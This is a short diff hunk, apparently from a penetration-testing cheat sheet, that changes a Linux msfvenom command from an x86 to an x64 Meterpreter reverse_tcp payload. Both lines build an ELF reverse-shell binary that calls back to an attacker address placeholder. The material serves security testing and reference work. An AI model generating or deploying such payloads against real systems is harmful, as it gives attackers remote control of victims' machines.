@@ -374,7 +374,7 @@ Default:
 ```
 Linux:
 ```
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<port_number> -f elf > rev_shell.elf
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<port_number> -f elf > rev_shell.elf
 ```
 
 Windows:
